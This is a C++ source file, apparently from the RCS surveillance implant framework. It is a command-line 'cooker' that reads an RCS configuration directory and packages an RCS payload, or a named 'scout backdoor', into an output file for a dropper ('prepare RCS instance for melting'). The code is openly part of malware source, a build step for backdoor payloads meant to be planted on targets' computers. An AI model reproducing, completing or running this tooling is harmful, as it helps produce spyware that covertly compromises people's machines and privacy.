#include <iostream>
#include <string>

using namespace std;

#include <boost/algorithm/string.hpp>
#include <boost/shared_ptr.hpp>
#include <boost/filesystem/fstream.hpp>
#include <boost/filesystem/operations.hpp>
#include <boost/filesystem.hpp>
namespace bf = boost::filesystem;

#include <boost/program_options.hpp>
namespace po = boost::program_options;

#include "../../RCSDropper/DropperCode.h"
#include "Components.h"
#include "RCSPayload.h"
#include "GenericPayload.h"
#include "RCSConfig.h"

std::string productName;
std::string productVersion;

int rcs_cook(bf::path rcs_directory, bf::path output_directory, BOOL bScout, char *scout_name);
int generic_cook(bf::path payload_path, bf::path output_directory);
bool buildStub(RCSConfig& ini);
bool printProductVersion();
bool findProductVersion();


extern int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);

int main(int argc, char* argv[])
{
	
	po::options_description desc("Allowed options");
	desc.add_options()
		("help", "this help message")
		("cook,C", "prepare RCS instance for melting")
		("rcs,R", po::value< string >(), "RCS directory")
		("demoimage,d", po::value< string >(), "Demo image")
		("ofile,O", po::value< string >()->default_value("cooked"), "output file")
		("scout,S", po::value<string>(), "cook for scout backdoor")
		("name,N", po::value<string>(), "scout name")
		("version,V", "product version")
		;
	
	po::variables_map vm;
	po::store(po::parse_command_line(argc, argv, desc), vm);
	po::notify(vm);
	
	findProductVersion();
	
	if (vm.count("version")) {
		printProductVersion();
		return 0;
	}
	
	if (vm.count("help")) {
		cout << endl;
		printProductVersion();
		cout << endl;
		cout << desc << endl;
		return 0;
	}
	
	bf::path output_filepath = vm["ofile"].as<string>();
	
	/*
	if (vm.count("generic")) {
		bf::path payload_directory = vm["generic"].as< string >();
		cout << "Generic payload	  : \"" << payload_directory << "\"" << endl;
		
		int ret = 1;
		try {
			ret = generic_cook(payload_directory, output_filepath);
		} catch (std::exception &e) {
			cout << "Cannot cook generic payload \"" << payload_directory << "\": " << e.what() << endl;
			bf::remove(output_filepath);
			return 1;
		}
		
		return ret;
	}
	*/
	
	if (vm.count("cook")) {
		if ( ! vm.count("rcs") ) {
			cout << "RCS not specified." << endl;
			return 1;
		}
		
		bf::path rcs_directory = vm["rcs"].as< string >();
		
		cout << "RCS directory       : \"" << rcs_directory << "\"" << endl;
		cout << "Output file         : \"" << output_filepath << "\"" << endl;
		
		int ret = 1;
		try {
			ret = rcs_cook(rcs_directory, output_filepath, FALSE, NULL);
		} catch (std::exception &e) {
			cout << "Cannot cook \"" << rcs_directory << "\": " << e.what() << endl;
			bf::remove(output_filepath);
			return 1;
		}
		
		return ret;
	}

	if (vm.count("scout"))
	{
		cout << "Cooking for scout" << endl;
		if (!vm.count("ofile"))
		{
			cout << "Output not specified." << endl;
			return 1;
		}
		cout << "Output file         : " << output_filepath << endl;

		int ret = 1;
		try
		{
			bf::path scout_directory  = vm["scout"].as< string >();
			char *scout_name = (char *)vm["name"].as< string >().c_str();

			cout << "Input file is " << scout_directory << endl;
			cout << "Scout name is " << scout_name << endl;
			ret = rcs_cook(scout_directory, output_filepath, TRUE, scout_name);
		}
		catch (std::exception &e) 
		{
			cout << "Cannot cook : " << e.what() << endl;
			bf::remove(output_filepath);
			return 1;
		}
		//WinMain(NULL, NULL, "", 0xa);

		return ret;
	}
	
	cout << desc << endl;
	return 1;
}

int generic_cook(bf::path payload_path, bf::path output_file)
{
	if ( ! bf::is_regular_file(payload_path) ) {
		cout << "Cannot find payload file \"" << payload_path << "\" or is not a regular file." << endl;
		return 1;
	}
	
	if ( bf::exists(output_file) )
		bf::remove(output_file);

	try {
		Components components(FALSE);
		GenericPayload payload(payload_path, components);
		payload.write( output_file );
	} catch (std::exception& e) {
		cout << "Error cooking: " << e.what() << endl;
		return 1;
	}
	
	return 0;
}

int rcs_cook(bf::path rcs_directory, bf::path output_file, BOOL bScout, char *scout_name)
{
	if ( bf::exists(output_file) )
		bf::remove(output_file);

	if (!bScout)
	{
		if ( ! bf::is_directory(rcs_directory) ) {
			cout << "Cannot find RCS directory \"" << rcs_directory << "\" or is not a directory." << endl;
			return 1;
		}

		try {
			
			RCSConfig rcs(rcs_directory, "RCS.ini", bScout);
			Components components(bScout);
			RCSPayload payload(rcs, components, bScout, NULL);
			payload.write( output_file );
		} catch (std::exception& e) {
			cout << "Error cooking: " << e.what() << endl;
			return 1;
		}
	}
	else
	{
		cout << "rcs_cook for SCOUT => " << scout_name << endl;

		try {
			RCSConfig rcs(rcs_directory, "RCS.ini", bScout);
			Components components(bScout);
			RCSPayload payload(rcs, components, bScout, scout_name);
			payload.write( output_file );
		} catch (std::exception& e) {
			cout << "Error cooking: " << e.what() << endl;
			return 1;
		}
	}
	
	return 0;
}

bool findProductVersion()
{
	// get the filename of the executable containing the version resource
	char szFilename[MAX_PATH + 1] = {0};
	if (GetModuleFileName(NULL, szFilename, MAX_PATH) == 0)
	{
		std::cout << "GetModuleFileName failed with error " << GetLastError() << std::endl;
		return false;
	}

	// allocate a block of memory for the version info
	DWORD dummy;
	DWORD dwSize = GetFileVersionInfoSize(szFilename, &dummy);
	if (dwSize == 0)
	{
		std::cout << "GetFileVersionInfoSize failed with error " << GetLastError() << std::endl;
		return false;
	}
	std::vector<BYTE> data(dwSize);

	// load the version info
	if (!GetFileVersionInfo(szFilename, NULL, dwSize, &data[0]))
	{
		std::cout << "GetFileVersionInfo failed with error " << GetLastError() << std::endl;
		return false;
	}

	// get the name and version strings
	LPVOID pvProductName = NULL;
	unsigned int iProductNameLen = 0;
	LPVOID pvProductVersion = NULL;
	unsigned int iProductVersionLen = 0;
	
	// replace "040904e4" with the language ID of your resources
	if (!VerQueryValue(&data[0], "\\StringFileInfo\\040904b0\\ProductName", &pvProductName, &iProductNameLen) ||
		!VerQueryValue(&data[0], "\\StringFileInfo\\040904b0\\ProductVersion", &pvProductVersion, &iProductVersionLen))
	{
		std::cout << "Can't obtain ProductName and ProductVersion from resources" << std::endl;
		return false;
	}

	productName = (char*) pvProductName;
	productVersion = (char*) pvProductVersion;
	boost::replace_all(productVersion, ",", ".");

	return true;
}

bool printProductVersion()
{
	std::cout << productName << " " << productVersion << std::endl;
	return true;
}
